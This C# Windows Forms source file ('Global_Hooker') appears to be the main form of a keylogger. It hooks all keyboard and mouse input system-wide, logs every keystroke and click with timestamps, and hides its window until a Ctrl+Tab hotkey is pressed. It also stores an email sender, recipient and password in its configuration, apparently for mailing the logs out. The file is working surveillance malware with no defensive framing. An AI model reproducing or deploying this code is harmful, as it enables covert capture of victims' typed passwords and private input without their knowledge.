using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Gma.System.MouseKeyHook;

namespace Global_Hooker
{
    public partial class Form1 : Form
    {
        private readonly ConfigurationManager _configuration;
        private readonly Logger _logger;
        private readonly IKeyboardMouseEvents _keyboardMouseEvents;
        private bool mouseEnable { get; set; }

        public Form1()
        {
            _configuration = ConfigurationManager.Instance;
            _logger = new Logger();
            _keyboardMouseEvents = Hook.GlobalEvents();
            _keyboardMouseEvents.KeyDown += HookKeyPress;
            _keyboardMouseEvents.MouseDownExt += HookMousePress;

            mouseEnable = true;

            InitializeComponent();
        }
        private void HookKeyPress(object sender, KeyEventArgs eventArgs)
        {
            _logger.LogKey($"| {DateTime.Now} | : {eventArgs.KeyData.ToString()}");
            if (eventArgs.KeyData.ToString().Equals("Tab, Alt"))
                eventArgs.Handled = true;
            if (eventArgs.KeyData.ToString().Equals("Tab, Control"))
            {
                this.SetAppHiddenMode(false);
            }
            if (eventArgs.KeyData == Keys.Tab)
            {
                eventArgs.Handled = true;
                mouseEnable = !mouseEnable;
            }
        }

        private void HookMousePress(object sender, MouseEventExtArgs eventArgs)
        {
            if (mouseEnable)
            {
                _logger.LogClick($"| {DateTime.Now} | : {eventArgs.Button + " " + eventArgs.Location}");
            }
            else
            {
                eventArgs.Handled = true;
            }
           
        }

        private void SetAppHiddenMode(bool hidden)
        {
            if (hidden)
            {
                Hide();
            }
            else
            {
                Show();
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            UpdateView();
        }

        private void SaveB_Click(object sender, EventArgs e)
        {
            _configuration.EmailAddresser = EmailAddresserT.Text;
            _configuration.EmailAddressee = EmailAddresseeT.Text;
            _configuration.EmailPassword = EmailPasswordT.Text;
            try
            {
                _configuration.MaxFileSize = int.Parse(FileSizeT.Text);
                if (_configuration.MaxFileSize <= 0)
                {
                    _configuration.MaxFileSize = 1000;          
                }
            }
            catch (Exception ex)
            {
                _configuration.MaxFileSize = 1000;
            }
            _configuration.HiddenMode = HiddenModeC.Checked.ToString();
            _configuration.SaveConfig();
            SetAppHiddenMode(HiddenModeC.Checked);
            UpdateView();
        }

        private void UpdateView()
        {
            EmailAddresseeT.Text = _configuration.EmailAddressee;
            EmailAddresserT.Text = _configuration.EmailAddresser;
            EmailPasswordT.Text = _configuration.EmailPassword;
            FileSizeT.Text = _configuration.MaxFileSize.ToString();
            HiddenModeC.Checked = _configuration.HiddenMode.Equals("True");
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            SetAppHiddenMode(HiddenModeC.Checked);
        }
    }
}
